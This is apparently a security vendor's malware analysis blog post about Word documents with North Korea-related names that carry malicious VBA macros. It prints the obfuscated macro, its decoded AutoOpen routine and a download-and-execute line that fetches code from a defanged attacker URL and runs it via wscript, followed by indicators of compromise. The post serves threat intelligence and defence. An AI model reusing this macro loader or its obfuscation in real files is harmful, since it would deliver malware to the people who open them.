@@ -1,0 +1,59 @@
+<div>
+Posted on <a href="https://asec.ahnlab.com/en/33894/" rel="bookmark" title="12:44 pm">May 2, 2022</a>
+<h1 class="title">Word Files Related to Diplomacy and National Defense Being Distributed</h1>
+<p>The ASEC analysis team has discovered the continuous distribution of malicious Word files with North Korea-related file names.</p>
+<figure class="aligncenter"><img alt="" class="wp-image-33853 jetpack-lazy-image jetpack-lazy-image--handled" height="1111" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/04/image-17.png?resize=826%2C1024&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="896"/><img alt="" class="wp-image-33853" height="1111" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/04/image-17.png?resize=826%2C1024&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="896"/><figcaption>Figure 1. 220426-North Korea’s Diplomatic Policy and Our Responses (Professor Jeong).doc</figcaption></figure>
+<p></p>
+<p>The Word files contain malicious VBA macro codes and are the same file type introduced in &lt;<a href="https://asec.ahnlab.com/en/28320/">Discovery of Continuous Distribution of North Korea-related Malicious Word Files</a>&gt;. The names of the distributed files that were recently discovered are as follows:</p>
+<ul><li>220426-North Korea’s Diplomatic Policy and Our Responses(Professor Jeong).doc (April 26th)</li><li>North Korea’s Diplomatic Policy and Our Responses.doc (April 26th)</li><li>China’s Diplomatic Policy and Our Responses.doc (April 22nd)</li><li>Press Release-INTERNATIONAL FORUM ON ONE KOREA 2022 -20220422.docm (April 23rd)</li><li>[Analysis] North Korea’s Position on Use of Nuclear Weapons and Implications of Changes in Military Elites Based on April 25th Military Parade (April 26th)</li></ul>
+<p>The discovered macro codes include a code that accesses certain URL and runs the downloaded data. The code discovered in the file ‘North Korea’s Diplomatic Policy and Our Responses.doc’ contains the following obfuscated string.</p>
+<code class="language-ts">Function Unpck(idx)
+ sa = Array("pi^c$", "wi^n$m~g^mts^:w^in@3^2_$pro~ces`s", "1q^a$z~2^wsx^", "On^ $E~r^ror^ R^es@u^me$ Ne~xt:`Set@ m@x $= ^Cr^ea`teO`b`je~ct^(`""~Mi^cro^so~ft$.X`MLH$TT`P""~):`mx^.op$en@ ""`GE@T`"",` ^""~h^tt`p:/$/g0`0gl`edr^iv^e`.^myw@eb^com`mu~nit$y@.o~rg`/f^il~e~/up^lo`ad^/li`st$.p`h^p?$qu`ery$=^1""~, F$al@se~:mx$.S`end@:$Ex$e@cu`te(`mx.^re$spo`ns~eT`ex^t)", "\v^e$r~s^ion^.i^ni@", "ws^c$r~i^pt.^ex^e @/^/e$:vb~scr`ipt@ /@/b$ ")
+ Key = "@ $ ~ ` ^"
+ s = sa(idx)
+ arrkey = Split(Key)
+ For Each k In arrkey
+ s = Replace(s, k, "")
+ Next
+ Unpck = s
+End Function</code>
+<p>The string is used by the AutoOpen() function that is automatically run when the Word file is opened. The decoded string is shown below.</p>
+<code class="language-ts">Sub AutoOpen()
+ On Error Resume Next
+ sn = Denor(0) 'pic
+ Set wm = GetObject(Denor(1)) 'winmgmts:win32_process
+ pw = Denor(2) '1qaz2wsx
+ Weed sn, pw
+ Present
+ Set wnd = ActiveDocument
+ wnd.Save
+ cnt = Denor(3) 'On Error Resume Next:Set mx = CreateObject("Microsoft.XMLHTTP"):mx.open "GET", "hxxp://g00gledrive.mywebcommunity[.]org/file/upload/list.php?query=1", False:mx.Send:Execute(mx.responseText)
+ pth = Templates(1).Path &amp; Denor(4) '\version.ini
+ ResContent pth, cnt
+ wm.Create Denor(5) &amp; pth 'wscript.exe //e:vbscript //b 
+End Sub</code>
+<p>The macro also contains a code related to removing document protection that was mentioned in the post &lt;<a href="https://asec.ahnlab.com/en/28320/">Discovery of Continuous Distribution of North Korea-related Malicious Word Files</a>&gt;. The password is 1qaz2wsx, meaning that the macro is likely created by the same attacker.</p>
+<p>The macro then creates the version.ini file in the %AppData%\Microsoft\Templates\ folder. Inside the file is a command that runs data downloaded from a particular URL. One characteristic of the macro is that it includes ‘list.php?query=1’ in the URL it accesses.</p>
+<code class="language-ts">On Error Resume Next:
+Set mx = CreateObject("Microsoft.XMLHTTP"):
+mx.open "GET", "hxxp://g00gledrive.mywebcommunity[.]org/file/upload/list.php?query=1", False:
+mx.Send:
+Execute(mx.responseText)</code>
+<p>The created ini file is run by the following command.</p>
+<ul><li>wscript.exe //e:vbscript //b %AppData%\Microsoft\Templates\version.ini</li></ul>
+<p>As the URL is no longer valid, the team could not find what the macro does after. Yet as the command used is the same as the one discovered in the post &lt;<a href="https://asec.ahnlab.com/en/32822/">Word Document Attack Targeting Companies Specialized in Carbon Emissions</a>&gt;, it appears that the macro performed behaviors such as leaking user PC information.</p>
+<p>As the attacker suspected of creating the malware is continuously distributing malicious Word files with North Korea-related content, users in the relevant field need to take caution. Users should refrain from opening attachments of emails and running macros of unknown sources.</p>
+<p>AhnLab’s anti-malware product, V3, detects and blocks the malware using the alias below.</p>
+<p>[File Detection]
+Downloader/DOC.Kimsuky</p>
+<p>[IOC]
+657b538698483f43aada2e5e4bc4a91d (VBA)
+cb2a18028055cdf1582c1c5ac3756203 (VBA)
+0a0f858beeb6914aaf07896b7790a1d4 (VBA)
+hxxp://g00gledrive.mywebcommunity[.]org/file/upload/list.php?query=1
+hxxp://impartment.myartsonline[.]com/file/upload/list.php?query=1</p>
+<p>Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to check related IOC and detailed analysis information.</p>
+<p>
+Categories:<a href="https://asec.ahnlab.com/en/category/malware-information/" rel="category tag">Malware Information</a> </p>
+<p>Tagged as:<a href="https://asec.ahnlab.com/en/tag/kimsuky-en/" rel="tag">Kimsuky</a>, <a href="https://asec.ahnlab.com/tag/vba-macro/" rel="tag">VBA Macro</a>, <a href="https://asec.ahnlab.com/tag/word-document/" rel="tag">Word Document</a></p>
+</div>
